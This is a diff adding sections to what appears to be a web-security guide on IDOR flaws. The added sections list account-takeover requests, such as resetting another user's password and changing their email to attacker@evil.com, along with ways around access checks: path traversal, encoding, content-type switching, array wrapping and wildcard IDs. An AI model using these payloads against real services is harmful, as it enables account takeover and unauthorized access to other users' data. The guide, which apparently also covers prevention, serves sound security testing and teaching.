@@ -288,6 +288,105 @@ POST /api/update
 
 ---
 
+### Account Takeover
+- Using IDOR to takeover accounts (Attack id: 123):
+  ```bash
+  # Password reset via IDOR
+  POST /api/reset-password
+  {
+    "user_id": 124,
+    "new_password": "attacker_password"
+  }
+  
+  # Email change via IDOR
+  PUT /api/user/124/email
+  {
+    "new_email": "attacker@evil.com"
+  }
+  
+  # Adding authentication method
+  POST /api/user/124/add-phone
+  {
+    "phone": "+1234567890"
+  }
+  ```
+
+### Bypasses (Attack id: 123)
+- Path Traversal Bypass
+  ```bash
+  # Directory traversal
+  GET /api/user/123
+  GET /api/user/../user/124
+  GET /api/user/./124
+  
+  # Encoding bypass
+  GET /api/user/%2e%2e%2fuser%2f124
+  GET /api/user/..%2fuser%2f124
+  
+  # Null byte injection (older systems)
+  GET /api/user/123%00/../../user/124
+  ```
+- Content-Type Bypass
+  ```bash
+  # Original JSON request (blocked)
+  POST /api/update-profile
+  Content-Type: application/json
+  {"user_id": 124}
+  
+  # Try XML
+  POST /api/update-profile
+  Content-Type: application/xml
+  <user>
+    <user_id>124</user_id>
+  </user>
+  
+  # Try form data
+  POST /api/update-profile
+  Content-Type: application/x-www-form-urlencoded
+  user_id=124
+  ```
+- Array Wrapping
+  ```bash
+  # Blocked
+  {
+    "user_id": 124
+  }
+  
+  # Try array wrapping
+  {
+    "user_id": [124]
+  }
+  
+  # Try nested object
+  {
+    "user": {
+      "id": 124
+    }
+  }
+  
+  # Try multiple values
+  {
+    "user_id": [123, 124]
+  }
+  ```
+- Wildcard Exploitation
+  ```bash
+  # Wildcard in IDs
+  GET /api/user/*
+  GET /api/user/%
+  GET /api/user/_
+  
+  # Regex exploitation
+  GET /api/user/.*
+  GET /api/user/[0-9]+
+  
+  # Range specification
+  GET /api/users?ids=1-100
+  GET /api/users?ids=*
+  ```
+
+---
+
 ## Prevention and Mitigation
 
 1. **Continuous user permission validation**  
